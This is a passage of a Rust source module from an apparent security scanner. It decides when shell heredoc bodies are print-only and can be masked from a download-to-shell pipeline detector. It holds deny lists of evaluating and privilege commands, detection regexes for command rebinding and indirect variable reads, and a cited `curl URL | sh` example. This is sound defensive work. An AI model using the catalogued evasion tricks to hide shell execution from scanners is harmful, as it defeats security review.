//! Heredoc text a shell file provably only prints (a `usage()` message, a
//! `: <<'COMMENT'` block, help text read into a variable that is only echoed).
//!
//! The core tokenizer does not know heredocs, so every heredoc line reads as a
//! command and help text such as `curl URL | sh` looked like a download-to-
//! shell pipeline. [`mask`] blanks such bodies so the download pass treats
//! them like comments. It is deliberately narrow and all-or-nothing: if
//! ANYTHING in the file could route printed text or a variable back into a
//! shell (a pipe into anything but a plain text filter, a file redirection, a
//! command substitution around the printer, eval/source/exec/coproc/trap, a
//! shell or privilege wrapper (also `$SHELL` / `$BASH`), a command whose name
//! is or holds an expansion, an alias, `BASH_CMDS` / `BASH_ALIASES`, zsh's
//! command tables or `path` / `fpath`, a redefined printer, filter or
//! `read`, a function whose name the word scan cannot read (`c\at() {`),
//! any `PATH` word other than a plain `$PATH` expansion, allexport; words
//! are also checked with backslashes and quotes removed), nothing is masked
//! and every heredoc line is read as before. A heredoc read or captured into
//! a variable is masked only when every use of the variable is a plain
//! expansion, outside any other `${...}` / `$[...]`, in an `echo` command or
//! a `printf` with a literal string-only format, and nothing can reach its value
//! without naming it (`${!name}`, a nameref, `$_`, a variable listing),
//! and the variable is not one the shell expands or evaluates by itself
//! (`PS4`, integer specials such as `OPTIND`; see [`SHELL_SPECIAL_NAMES`]).
//!
//! Model boundary: what the CALLER does with this file's stdout, and a
//! non-shell interpreter evaluating text this file reads back from its own
//! source, are outside it, as they already are for comments and quoted
//! strings.

use std::collections::{BTreeMap, BTreeSet};
use std::ops::Range;

use crate::extract::PosixHeredocSpan;

/// Commands that only print (or discard) a heredoc fed to them.
const PRINTERS: &[&str] = &["cat", "echo", "printf", ":"];

/// Pipe stages that only write filtered text to stdout: no output-file
/// operand, no command execution.
const TEXT_FILTERS: &[&str] = &[
    "cat", "grep", "egrep", "fgrep", "head", "tail", "wc", "cut", "tr", "column", "fold", "fmt",
    "nl", "rev", "tac", "paste", "expand", "unexpand",
];

/// Redirection words allowed on a printer's header line and anywhere in the
/// file: they only reorder stdout/stderr or discard output.
const FD_REDIRECTS: &[&str] = &[
    ">&2",
    "1>&2",
    ">&1",
    "2>&1",
    ">/dev/null",
    "2>/dev/null",
    "1>/dev/null",
];

/// Words that evaluate text, change what a command name means, or start a
/// shell (which could read text back as code). Any of them anywhere disables
/// masking.
const EVALUATING_WORDS: &[&str] = &[
    "eval",
    "source",
    "exec",
    "coproc",
    "trap",
    "alias",
    "unalias",
    "enable",
    "hash",
    "declare",
    "typeset",
    "command_not_found_handle",
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "mksh",
    "ash",
    "yash",
    "posh",
    "fish",
    "csh",
    "tcsh",
    "busybox",
    "sudo",
    "su",
    "doas",
    "runuser",
    "pkexec",
    // zsh loads a function (which may be named `cat`) from `fpath`.
    "autoload",
    // `$SHELL` / `$BASH` name the running shell.
    "SHELL",
    "BASH",
];

/// Names that rebind a command without an [`EVALUATING_WORDS`] word: bash
/// 4+ writes its command hash table through `BASH_CMDS[cat]=...` and its
/// aliases through `BASH_ALIASES[cat]=...` (also with `+=`, which
/// [`words`] keeps attached). Matched as whole identifiers.
const REBINDING_NAMES: &[&str] = &["BASH_CMDS", "BASH_ALIASES", "expand_aliases"];

/// Variables the shell itself reads, expands or evaluates, so text read or
/// captured into one can run without the file naming it again: `PS4` is
/// expanded (command substitutions included) for every command under
/// xtrace, and assigning an integer special such as `OPTIND`, `HISTCMD`,
/// `RANDOM` (bash, sh) or `SECONDS`, `LINENO`, `TMOUT` (ksh) evaluates the
/// value as arithmetic, running substitutions in array subscripts. A
/// heredoc read or captured into any of these, or into a name starting
/// with one of [`SHELL_SPECIAL_PREFIXES`], is never masked.
const SHELL_SPECIAL_NAMES: &[&str] = &[
    "ENV",
    "IFS",
    "PATH",
    "CDPATH",
    "FPATH",
    "NULLCMD",
    "READNULLCMD",
    "SHELLOPTS",
    "OPTIND",
    "OPTARG",
    "OPTERR",
    "RANDOM",
    "SRANDOM",
    "SECONDS",
    "LINENO",
    "TMOUT",
    "MAIL",
    "MAILCHECK",
    "MAILPATH",
    "JOBMAX",
    "PPID",
    "SHLVL",
    "FUNCNEST",
    "COLUMNS",
    "LINES",
    "EPOCHSECONDS",
    "EPOCHREALTIME",
    "FCEDIT",
    "EDITOR",
    "VISUAL",
    "HOME",
    "PWD",
    "OLDPWD",
    "TMPDIR",
    "POSIXLY_CORRECT",
    "GLOBIGNORE",
    "EXECIGNORE",
    "TIMEFORMAT",
    "IGNOREEOF",
    "CHILD_MAX",
    "INPUTRC",
    "HOSTFILE",
    "TERM",
    "LANG",
    "UID",
    "EUID",
    "GROUPS",
    "REPLY",
    "DIRSTACK",
    "PIPESTATUS",
    "FUNCNAME",
    "MAPFILE",
    "KEYTIMEOUT",
    "ERRNO",
];

/// Name prefixes of shell-special variable families: `BASH_ENV`,
/// `BASH_XTRACEFD`, `PS0`-`PS4`, `PROMPT_COMMAND`, zsh prompts, history,
/// completion, readline and locale settings.
const SHELL_SPECIAL_PREFIXES: &[&str] = &[
    "BASH", "PS", "PROMPT", "RPROMPT", "RPS", "HIST", "COMP", "READLINE", "ZSH", "LC_",
];

/// Lines longer than this never hold an accepted variable print.
const MAX_LINE: usize = 4096;

/// More mentions of a captured variable than this are not checked one by
/// one; the heredoc stays live.
const MAX_VARIABLE_MENTIONS: usize = 64;

/// Prefixes allowed before a printer on its header line.
const HEADER_PREFIXES: &[&str] = &["{", "then", "do", "else"];

/// Commands a candidate header or a variable print runs besides the
/// [`PRINTERS`] and [`TEXT_FILTERS`]: a function with one of these names
/// receives the heredoc (or the assignment holding it) instead of the
/// builtin.
const HEADER_COMMANDS: &[&str] = &["read", "local", "readonly", "true"];

/// Characters that make a function name something the word scan cannot
/// compare (`c\at`, `'read'`, `re${E}ad`, `{cat,x}`): such a definition
/// disables masking.
const UNRESOLVED_NAME: &[char] = &['\\', '\'', '"', '$', '`', '{', '}', '[', ']', '*', '?', '~'];

enum Shape {
    /// `cat <<EOF`: output goes to stdout/stderr.
    Printer,
    /// `NAME=$(cat <<EOF` ... `)`: `open` is the `$(` offset, `closer` the
    /// line holding the closing `)`.
    Capture {
        name: String,
        open: usize,
        closer: Range<usize>,
    },
    /// `read -r -d '' NAME <<EOF`.
    Read { name: String },
}

/// A heredoc body that may be executed.
pub(super) struct LiveBody {
    pub(super) range: Range<usize>,
    /// The delimiter was quoted, so the body is not expanded when it is read.
    pub(super) quoted: bool,
}

impl LiveBody {
    fn of(span: &PosixHeredocSpan) -> Self {
        Self {
            range: span.body.clone(),
            quoted: span.quoted,
        }
    }
}

/// A shell file's heredocs, split into provably shown-only text and the rest.
#[derive(Default)]
pub(super) struct HeredocView {
    /// The text with every shown-only body and terminator blanked, when at
    /// least one was.
    pub(super) masked: Option<String>,
    /// Bodies that may be executed. The tokenizer can miss them as a whole
    /// (inside `eval "$(cat <<EOF ...)"` they sit in a quoted word), so the
    /// caller also scans each one on its own.
    pub(super) live_bodies: Vec<LiveBody>,
    /// A heredoc whose boundaries are ambiguous (opened inside a quoted
    /// word, unterminated, oversized, a here-string): nothing is masked and
    /// the caller adds a line-by-line pass.
    pub(super) ambiguous: bool,
}

pub(super) fn analyze(text: &str) -> HeredocView {
    if !text.contains("<<") {
        return HeredocView::default();
    }
    let Some(spans) = crate::extract::posix_heredoc_spans(text) else {
        return HeredocView {
            ambiguous: true,
            ..HeredocView::default()
        };
    };
    // `<<` the heredoc parser did not take as an operator (inside a quoted
    // word, as in `eval "$(cat <<EOF`, or arithmetic) leaves its lines to
    // the tokenizer, which may see them only as one quoted word.
    let mut outside = text.as_bytes().to_vec();
    for span in &spans {
        blank(&mut outside, span.through_terminator.clone());
    }
    let outside = blank_comment_lines(&String::from_utf8_lossy(&outside));
    let operators = outside
        .matches("<<")
        .count()
        .saturating_sub(outside.matches("<<<").count());
    if operators != spans.len() {
        return HeredocView {
            ambiguous: true,
            ..HeredocView::default()
        };
    }
    match mask(text, &spans) {
        Some((masked, inert)) => HeredocView {
            masked: Some(masked),
            live_bodies: spans
                .iter()
                .filter(|span| !inert.contains(&span.body.start))
                .map(LiveBody::of)
                .collect(),
            ambiguous: false,
        },
        None => HeredocView {
            masked: None,
            live_bodies: spans.iter().map(LiveBody::of).collect(),
            ambiguous: false,
        },
    }
}

/// The text with every provably-inert heredoc body (and terminator) blanked
/// and the start offsets of those bodies, or `None` when nothing may be
/// masked.
fn mask(text: &str, spans: &[PosixHeredocSpan]) -> Option<(String, BTreeSet<usize>)> {
    if spans.is_empty() {
        return None;
    }
    // Group heredocs by their header line.
    let mut headers: Vec<(Range<usize>, Vec<&PosixHeredocSpan>)> = Vec::new();
    for span in spans {
        match headers.last_mut() {
            Some((header, group)) if *header == span.header => group.push(span),
            _ => headers.push((span.header.clone(), vec![span])),
        }
    }

    let mut candidates: Vec<(Range<usize>, Shape, Vec<&PosixHeredocSpan>)> = Vec::new();
    for (header, group) in headers {
        if group.iter().any(|span| expands(text, span)) {
            continue;
        }
        let mut line = text.as_bytes()[header.clone()].to_vec();
        for span in &group {
            for byte in
                &mut line[span.operator.start - header.start..span.operator.end - header.start]
            {
                *byte = b' ';
            }
        }
        let Ok(line) = String::from_utf8(line) else {
            continue;
        };
        let last_end = group
            .last()
            .map_or(header.end, |span| span.through_terminator.end);
        if let Some(shape) = header_shape(text, &header, &line, last_end) {
            candidates.push((header, shape, group));
        }
    }
    if candidates.is_empty() {
        return None;
    }

    // The rest of the file: candidate bodies blanked, quote-free full-line
    // comments (shebang included) blanked. Capture and read headers stay
    // for the substitution check.
    let mut rest = text.as_bytes().to_vec();
    let mut masked = rest.clone();
    let mut names = Vec::new();
    // Capture `$(` offset -> the line holding its `)`.
    let mut captures = BTreeMap::new();
    let mut variable_lines = Vec::new();
    for (header, shape, group) in &candidates {
        for span in group {
            blank(&mut rest, span.through_terminator.clone());
            blank(&mut masked, span.through_terminator.clone());
        }
        match shape {
            Shape::Printer => {}
            Shape::Capture { name, open, closer } => {
                names.push(name.clone());
                captures.insert(*open, closer.clone());
                blank(&mut masked, header.clone());
                blank(&mut masked, closer.clone());
                variable_lines.push(header.clone());
                variable_lines.push(closer.clone());
            }
            Shape::Read { name } => {
                names.push(name.clone());
                blank(&mut masked, header.clone());
                variable_lines.push(header.clone());
            }
        }
    }
    let rest = blank_comment_lines(&String::from_utf8(rest).ok()?);
    let header_starts: Vec<usize> = candidates.iter().map(|(header, ..)| header.start).collect();
    if !rest_is_inert(&rest, &header_starts, &captures, &names) {
        return None;
    }
    if !names.is_empty() && reads_variables_indirectly(&rest) {
        return None;
    }
    // Variable uses: the assignments themselves are not uses, and a mention
    // inside another heredoc's body is data for an unknown consumer.
    let mut uses = rest.into_bytes();
    for line in variable_lines {
        blank(&mut uses, line);
    }
    let uses = String::from_utf8(uses).ok()?;
    let substitutions = substitution_ranges(&uses)?;
    let other_bodies: Vec<Range<usize>> = spans
        .iter()
        .filter(|span| {
            !candidates
                .iter()
                .any(|(_, _, group)| group.iter().any(|own| own.body == span.body))
        })
        .map(|span| span.body.clone())
        .collect();
    let (quoted, expansions) = if names.is_empty() {
        (Vec::new(), Vec::new())
    } else {
        (
            quoted_regions(&uses, &other_bodies)?,
            expansion_ranges(&uses),
        )
    };
    if !names.iter().all(|name| {
        variable_only_printed(
            &uses,
            name,
            &substitutions,
            &other_bodies,
            &quoted,
            &expansions,
        )
    }) {
        return None;
    }
    let inert = candidates
        .iter()
        .flat_map(|(_, _, group)| group.iter().map(|span| span.body.start))
        .collect();
    Some((String::from_utf8(masked).ok()?, inert))
}

fn blank(bytes: &mut [u8], range: Range<usize>) {
    for byte in bytes.get_mut(range).into_iter().flatten() {
        if !matches!(*byte, b'\n' | b'\r') {
            *byte = b' ';
        }
    }
}

/// An unquoted body runs `$(...)`, backticks and `$[...]` when the heredoc is
/// read, so it is code whatever consumes it.
fn expands(text: &str, span: &PosixHeredocSpan) -> bool {
    let body = &text[span.body.clone()];
    !span.quoted && (body.contains('`') || body.contains("$(") || body.contains("$["))
}

fn is_name(word: &str) -> bool {
    let mut chars = word.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// A variable name the shell treats specially (see [`SHELL_SPECIAL_NAMES`]).
fn shell_special(name: &str) -> bool {
    SHELL_SPECIAL_NAMES.contains(&name)
        || SHELL_SPECIAL_PREFIXES
            .iter()
            .any(|prefix| name.starts_with(prefix))
}

fn header_shape(text: &str, header: &Range<usize>, line: &str, last_end: usize) -> Option<Shape> {
    let mut words: Vec<&str> = line.split_whitespace().collect();
    while words
        .first()
        .is_some_and(|word| HEADER_PREFIXES.contains(word))
    {
        words.remove(0);
    }
    let (&first, rest) = words.split_first()?;
    if PRINTERS.contains(&first) {
        return rest
            .iter()
            .all(|word| FD_REDIRECTS.contains(word))
            .then_some(Shape::Printer);
    }

    // `[local|readonly] NAME=$(cat` / `NAME="$(cat`, closed by a `)` line.
    let (assignment, rest) = match first {
        "local" | "readonly" => rest.split_first()?,
        _ => (&first, rest),
    };
    if let Some((name, value)) = assignment
        .split_once('=')
        .filter(|(_, value)| value.contains("$("))
    {
        let quoted = match value {
            "$(cat" => false,
            "\"$(cat" => true,
            _ => return None,
        };
        if !is_name(name)
            || shell_special(name)
            || !rest.iter().all(|word| FD_REDIRECTS.contains(word))
        {
            return None;
        }
        let open = header.start + line.find("$(cat")?;
        let closer_start = last_end;
        let closer_end = text[closer_start..]
            .find('\n')
            .map_or(text.len(), |offset| closer_start + offset);
        let expected = if quoted { ")\"" } else { ")" };
        if text[closer_start..closer_end].trim() != expected {
            return None;
        }
        return Some(Shape::Capture {
            name: name.to_string(),
            open,
            closer: closer_start..closer_end,
        });
    }

    // `[IFS=] read [-r] [-d ''] NAME [|| true]`.
    let mut words = words.as_slice();
    if words.first() == Some(&"IFS=") {
        words = &words[1..];
    }
    let (&"read", mut words) = words.split_first()? else {
        return None;
    };
    if let [head @ .., "||", "true" | ":"] = words {
        words = head;
    }
    let (&name, flags) = words.split_last()?;
    let flags_ok = flags
        .iter()
        .all(|flag| matches!(*flag, "-r" | "-d" | "-rd" | "''" | "\"\""));
    (flags_ok && is_name(name) && !shell_special(name)).then(|| Shape::Read {
        name: name.to_string(),
    })
}

/// Blank full-line comments that contain no quote or escape character. Such
/// a line cannot end a string, so whether it is a comment or string data,
/// this shell never runs it. A line after a backslash-newline continuation
/// is joined to the previous one, where its `#` may sit inside a word
/// (`echo "$X"\` then `#|sh` runs `echo "$X"#|sh`), so it stays.
fn blank_comment_lines(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut continued = false;
    for line in text.split_inclusive('\n') {
        let trimmed = line.trim_start();
        if !continued && trimmed.starts_with('#') && !line.contains(['"', '\'', '`', '\\']) {
            out.extend(line.chars().map(|c| if c == '\n' { '\n' } else { ' ' }));
        } else {
            out.push_str(line);
        }
        continued = ends_in_continuation(line);
    }
    out
}

/// True when `line` (with or without its newline) ends in an odd number of
/// backslashes, so the shell joins the next physical line to it.
fn ends_in_continuation(line: &str) -> bool {
    let content = line.strip_suffix('\n').unwrap_or(line);
    content.bytes().rev().take_while(|&b| b == b'\\').count() % 2 == 1
}

/// True when `segment` holds a lone `&` (a background separator), i.e. one
/// that is not part of `&&`, `>&` / `<&` or `&>` / `&>>`.
fn has_background_separator(segment: &str) -> bool {
    let bytes = segment.as_bytes();
    bytes.iter().enumerate().any(|(index, &byte)| {
        byte == b'&'
            && !(index > 0 && matches!(bytes[index - 1], b'&' | b'>' | b'<'))
            && !matches!(bytes.get(index + 1), Some(b'&' | b'>'))
    })
}

/// Every `$(`, `<(`, `>(`, `=(` and backtick substitution, as byte ranges of
/// the opener through the closer. `None` when one does not close.
fn substitution_ranges(text: &str) -> Option<Vec<Range<usize>>> {
    let bytes = text.as_bytes();
    let mut ranges = Vec::new();
    let mut backtick_closers = BTreeSet::new();
    for index in 0..bytes.len() {
        if bytes[index] == b'`' {
            if (index > 0 && bytes[index - 1] == b'\\') || backtick_closers.contains(&index) {
                continue;
            }
            let close = crate::extract::posix_backtick_close(text, index)?;
            backtick_closers.insert(close);
            ranges.push(index..close + 1);
        } else if bytes[index] == b'('
            && index > 0
            && matches!(bytes[index - 1], b'$' | b'<' | b'>' | b'=')
        {
            let close = crate::extract::posix_delimiter_close(text, index)?;
            ranges.push(index - 1..close + 1);
        }
    }
    Some(ranges)
}

fn words(text: &str) -> impl Iterator<Item = &str> {
    text.split(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | ':' | '+')))
        .filter(|word| !word.is_empty())
}

fn function_names(text: &str) -> BTreeSet<String> {
    static DEFINITION: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
        regex::Regex::new(
            r"(?m)(?:^|[;&|{(\s])(?:function\s+)?([A-Za-z_:.][A-Za-z0-9_:.+-]*)\s*\(\s*\)|(?:^|[;&|{(\s])function\s+([A-Za-z_:.][A-Za-z0-9_:.+-]*)",
        )
        .expect("static regex")
    });
    DEFINITION
        .captures_iter(text)
        .filter_map(|captures| captures.get(1).or_else(|| captures.get(2)))
        .map(|name| name.as_str().to_string())
        .collect()
}

/// The global conditions, checked on the rest of the file.
fn rest_is_inert(
    rest: &str,
    header_starts: &[usize],
    captures: &BTreeMap<usize, Range<usize>>,
    names: &[String],
) -> bool {
    // Nothing evaluates text, starts a shell or rebinds a command name, also
    // when the word is spelled with backslashes or quotes inside it
    // (`ha\sh`, `al''ias`): the shell removes those before it looks the
    // word up.
    let spelled: Option<String> = rest.contains(['\\', '\'', '"']).then(|| {
        rest.chars()
            .filter(|c| !matches!(c, '\\' | '\'' | '"'))
            .collect()
    });
    if std::iter::once(rest).chain(spelled.as_deref()).any(|view| {
        words(view).any(|word| EVALUATING_WORDS.contains(&word) || word == "allexport")
            || view
                .split(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
                .any(|identifier| REBINDING_NAMES.contains(&identifier))
            || names_path(view)
            || zsh_rebinding(view)
    }) || expansion_command_word(rest)
        || dot_command(rest)
        || line_has_flag(rest, "set", 'a')
        || line_has_flag(rest, "export", 'f')
    {
        return false;
    }
    let functions = function_names(rest);
    if functions.iter().any(|name| {
        PRINTERS.contains(&name.as_str())
            || TEXT_FILTERS.contains(&name.as_str())
            || HEADER_COMMANDS.contains(&name.as_str())
    }) || defines_unresolved_function(rest)
    {
        return false;
    }
    if !pipes_only_filter(rest) || !redirects_only_reorder(rest) {
        return false;
    }
    // No printed text is captured: no printer, function or inert variable
    // inside a substitution, and no candidate header inside one other than
    // its own capture.
    let Some(substitutions) = substitution_ranges(rest) else {
        return false;
    };
    for range in &substitutions {
        if let Some(closer) = captures.get(&range.start) {
            // A capture holds exactly its own heredoc: it closes on its
            // closer line and nothing else opens inside it.
            if !closer.contains(&(range.end - 1))
                || substitutions
                    .iter()
                    .any(|other| other.start > range.start && other.start < range.end)
            {
                return false;
            }
            continue;
        }
        if header_starts.iter().any(|start| range.contains(start)) {
            return false;
        }
        let body = &rest[range.clone()];
        if words(body).any(|word| {
            PRINTERS.contains(&word)
                || functions.contains(word)
                || names.iter().any(|name| name == word)
        }) {
            return false;
        }
    }
    // Every capture was found as a substitution.
    captures
        .keys()
        .all(|open| substitutions.iter().any(|range| range.start == *open))
}

/// zsh rebinds a command name through its parameter tables
/// (`functions[cat]=...`, `commands[cat]=...`, `aliases[cat]=...`) and finds
/// commands and autoloaded functions through the arrays tied to `PATH` and
/// `FPATH` (`path=(./bin $path)`). An assignment to one of these, or a
/// `read` / `vared` / `set -A` / `for` naming `path` or `fpath`, disables
/// masking.
fn zsh_rebinding(text: &str) -> bool {
    static ASSIGNMENT: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
        regex::Regex::new(concat!(
            r"(?:^|[^A-Za-z0-9_$.{/-])",
            r"(?:functions|functions_source|dis_functions|commands|aliases|dis_aliases|galiases|dis_galiases|saliases|dis_saliases|builtins|path|fpath)",
            r"(?:\[[^\]\n]*\])?\+?=",
        ))
        .expect("static regex")
    });
    static NAMED: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
        regex::Regex::new(
            r"(?m)\b(?:read|vared|set|for|select|getopts)\b[^\n;&|]*[\s(](?:path|fpath)\b",
        )
        .expect("static regex")
    });
    ASSIGNMENT.is_match(text) || NAMED.is_match(text)
}

/// A function definition whose name holds a character in
/// [`UNRESOLVED_NAME`]: ksh and zsh define `c\at() { ...; }` and
/// `'cat'() { ...; }` as `cat`, and zsh expands `re${E}ad() { ...; }` to
/// `read`, so the name cannot be compared with the header commands.
fn defines_unresolved_function(text: &str) -> bool {
    static DEFINITION: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
        regex::Regex::new(
            r"(?m)(?:^|[;&|{(\s])(?:function\s+)?([^\s;&|()<>]+)\s*\(\s*\)|(?:^|[;&|{(\s])function\s+([^\s;&|()<>]+)",
        )
        .expect("static regex")
    });
    DEFINITION
        .captures_iter(text)
        .filter_map(|captures| captures.get(1).or_else(|| captures.get(2)))
        .any(|name| name.as_str().contains(UNRESOLVED_NAME))
}

/// The word `PATH` anywhere except as a plain `$PATH` / `${PATH}`
/// expansion. Besides `PATH=` / `PATH+=` (`export PATH=...`, `PATH=x cmd`),
/// `for PATH in`, `read PATH`, `getopts ... PATH` and the like also set it,
/// which changes what `cat` runs.
fn names_path(text: &str) -> bool {
    let bytes = text.as_bytes();
    let ident = |byte: u8| byte.is_ascii_alphanumeric() || byte == b'_';
    text.match_indices("PATH").any(|(at, _)| {
        let end = at + "PATH".len();
        if (at > 0 && ident(bytes[at - 1])) || bytes.get(end).copied().is_some_and(ident) {
            return false;
        }
        let expansion = (at >= 1 && bytes[at - 1] == b'$')
            || (at >= 2 && &bytes[at - 2..at] == b"${" && bytes.get(end) == Some(&b'}'));
        !expansion
    })
}

/// A command word (after assignments and plain wrappers such as `env`,
/// `nohup` or `command`) that is or holds an expansion (`$X`, `"${X}"`,
/// `"$@"`, `$(...)`, `al${E}ias`, `$'\x61lias'`): the file runs a command it
/// computes, which could be a shell reading text back or a builtin that
/// rebinds `cat`. Defence in depth next to the per-variable check, so
/// a parse slip there cannot mask a body this file executes. Quoted text
/// that only looks like a command position fails toward the signal.
fn expansion_command_word(text: &str) -> bool {
    static COMMAND_WORD: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
        regex::Regex::new(concat!(
            // A command position: line start, a separator, a substitution
            // or group opener, a case-arm `)` or a compound keyword.
            r"(?m)(?:^|[;&|`]|\$\(|[^$(]\(|[^$]\{|\)[ \t]|\b(?:then|do|else|elif|if|while|until|time)\b)",
            r"[ \t]*(?:[!{(][ \t]*)*",
            // Assignments before the command (a value holding a
            // substitution is not skipped: its `$(` is a command position).
            r#"(?:[A-Za-z_][A-Za-z0-9_]*\+?=(?:"[^"\n]*"|'[^'\n]*'|[^ \t;&|()"'`\\])*[ \t]+)*"#,
            // Wrappers that run their operand, with options, numbers and
            // assignments.
            r"(?:(?:env|nohup|nice|command|builtin|setsid|xargs|timeout|stdbuf|time)",
            r#"(?:[ \t]+(?:-[^ \t;&|]*|[0-9][^ \t;&|]*|[A-Za-z_][A-Za-z0-9_]*=(?:"[^"\n]*"|'[^'\n]*'|[^ \t;&|()"'`\\])*))*[ \t]+)*"#,
            // The command word holds an expansion anywhere (`$X`, `"$X"`,
            // `al${E}ias`, `$'\x61lias'`), except as an assignment value.
            r#"[^ \t\n;&|()<>=]*\$[A-Za-z_{(@*0-9!#?'"-]"#,
        ))
        .expect("static regex")
    });
    COMMAND_WORD.is_match(text)
}

/// A way to read a variable's value without writing its name: indirect
/// expansion (`${!v}`, `${!PREFIX*}`), a nameref (`local -n`, `readonly
/// -n`), the last argument of the previous command (`$_`), or a builtin
/// that lists variables with their values (a bare `set`, `local`,
/// `readonly` / `export` with only options). `declare` / `typeset` are
/// already evaluating words.
fn reads_variables_indirectly(text: &str) -> bool {
    static LAST_ARGUMENT: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
        regex::Regex::new(r"\$\{?_(?:[^A-Za-z0-9_]|$)").expect("static regex")
    });
    static BARE_SET: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
        regex::Regex::new(r"(?m)(?:^|[;&|(){}\s])set[ \t]*(?:$|[;&|)}>#])").expect("static regex")
    });
    static LISTING: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
        regex::Regex::new(
            r"(?m)(?:^|[;&|(){}\s])(?:local|readonly|export)(?:[ \t]+[-+][A-Za-z]*)*[ \t]*(?:$|[;&|)}>#])",
        )
        .expect("static regex")
    });
    text.contains("${!")
        || line_has_flag(text, "local", 'n')
        || line_has_flag(text, "readonly", 'n')
        || LAST_ARGUMENT.is_match(text)
        || BARE_SET.is_match(text)
        || LISTING.is_match(text)
}

/// The byte ranges of `text` inside quotes (`'...'`, `"..."`, `$'...'`),
/// from the opening through the closing quote. Comments, command and
/// process substitutions (opaque) and the `skip` ranges (heredoc bodies,
/// which are not shell words) are passed over. `None` when a quote or
/// substitution does not close, or a `${...}` inside double quotes holds a
/// quote or substitution (shells nest those differently).
fn quoted_regions(text: &str, skip: &[Range<usize>]) -> Option<Vec<Range<usize>>> {
    let bytes = text.as_bytes();
    let mut skip: Vec<&Range<usize>> = skip.iter().collect();
    skip.sort_by_key(|range| range.start);
    let mut next_skip = 0usize;
    let mut regions = Vec::new();
    let mut index = 0usize;
    while index < bytes.len() {
        while skip.get(next_skip).is_some_and(|range| range.end <= index) {
            next_skip += 1;
        }
        if let Some(range) = skip.get(next_skip).filter(|range| range.start <= index) {
            index = range.end;
            continue;
        }
        let word_start = index == 0
            || matches!(
                bytes[index - 1],
                b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')'
            );
        let next = bytes.get(index + 1).copied();
        match bytes[index] {
            b'\\' => index += 2,
            b'#' if word_start => {
                index = text[index..]
                    .find('\n')
                    .map_or(bytes.len(), |offset| index + offset);
            }
            b'\'' => {
                let close = index + 1 + text[index + 1..].find('\'')?;
                regions.push(index..close + 1);
                index = close + 1;
            }
            b'$' if next == Some(b'\'') => {
                let close = ansi_c_close(bytes, index + 2)?;
                regions.push(index..close + 1);
                index = close + 1;
            }
            b'"' => {
                let close = double_quote_close(text, index)?;
                regions.push(index..close + 1);
                index = close + 1;
            }
            b'`' => index = crate::extract::posix_backtick_close(text, index)? + 1,
            b'$' | b'<' | b'>' if next == Some(b'(') => {
                index = crate::extract::posix_delimiter_close(text, index + 1)? + 1;
            }
            _ => index += 1,
        }
    }
    Some(regions)
}

/// The closing `'` of a `$'...'` string whose text starts at `start`.
fn ansi_c_close(bytes: &[u8], start: usize) -> Option<usize> {
    let mut index = start;
    while index < bytes.len() {
        match bytes[index] {
            b'\\' => index += 2,
            b'\'' => return Some(index),
            _ => index += 1,
        }
    }
    None
}

/// The closing `"` of the double-quoted string opened at `open`.
fn double_quote_close(text: &str, open: usize) -> Option<usize> {
    let bytes = text.as_bytes();
    let mut index = open + 1;
    while index < bytes.len() {
        let next = bytes.get(index + 1).copied();
        match bytes[index] {
            b'\\' => index += 2,
            b'"' => return Some(index),
            b'`' => index = crate::extract::posix_backtick_close(text, index)? + 1,
            b'$' if next == Some(b'(') => {
                index = crate::extract::posix_delimiter_close(text, index + 1)? + 1;
            }
            b'$' if next == Some(b'{') => {
                let close = index + text[index..].find('}')?;
                let inner = &text[index..close];
                if inner.contains(['"', '\'', '`']) || inner.contains("$(") {
                    return None;
                }
                index = close + 1;
            }
            _ => index += 1,
        }
    }
    None
}

/// The words of `command` after any [`HEADER_PREFIXES`].
fn after_prefixes(command: &str) -> std::iter::Peekable<std::str::SplitWhitespace<'_>> {
    let mut words = command.split_whitespace().peekable();
    while words
        .peek()
        .is_some_and(|word| HEADER_PREFIXES.contains(word))
    {
        words.next();
    }
    words
}

/// Whether `offset` lies strictly inside one of the sorted `regions`.
fn inside(regions: &[Range<usize>], offset: usize) -> bool {
    let first = regions.partition_point(|region| region.end <= offset);
    regions
        .get(first)
        .is_some_and(|region| region.start < offset)
}

/// `.` (source) in command position.
fn dot_command(text: &str) -> bool {
    let bytes = text.as_bytes();
    (0..bytes.len()).any(|index| {
        bytes[index] == b'.'
            && bytes
                .get(index + 1)
                .is_none_or(|next| next.is_ascii_whitespace())
            && text[..index]
                .trim_end_matches([' ', '\t'])
                .chars()
                .next_back()
                .is_none_or(|previous| matches!(previous, '\n' | ';' | '&' | '|' | '(' | '{' | '!'))
            || bytes[index] == b'.'
                && bytes
                    .get(index + 1)
                    .is_none_or(|next| next.is_ascii_whitespace())
                && ["then", "do", "else", "elif", "if", "while", "until", "time"]
                    .iter()
                    .any(|keyword| {
                        text[..index]
                            .trim_end_matches([' ', '\t'])
                            .rsplit(|c: char| c.is_whitespace() || c == ';')
                            .next()
                            == Some(keyword)
                    })
    })
}

/// `command` followed on its line by a short-option word holding `flag`:
/// `set -a`, `set -ea` (allexport; `set -o allexport` is caught by the
/// word), `export -f` / `export -nf` (exported functions).
fn line_has_flag(text: &str, command: &str, flag: char) -> bool {
    text.lines().any(|line| {
        let mut words = line.split_whitespace().skip_while(|word| *word != command);
        words.next().is_some()
            && words.any(|word| {
                (word.starts_with('-') || word.starts_with('+'))
                    && !word.starts_with("--")
                    && word[1..].contains(flag)
            })
    })
}

/// Every `|` / `|&` feeds a plain text filter, or separates `case` patterns.
fn pipes_only_filter(text: &str) -> bool {
    let bytes = text.as_bytes();
    let mut index = 0usize;
    while index < bytes.len() {
        if bytes[index] != b'|' {
            index += 1;
            continue;
        }
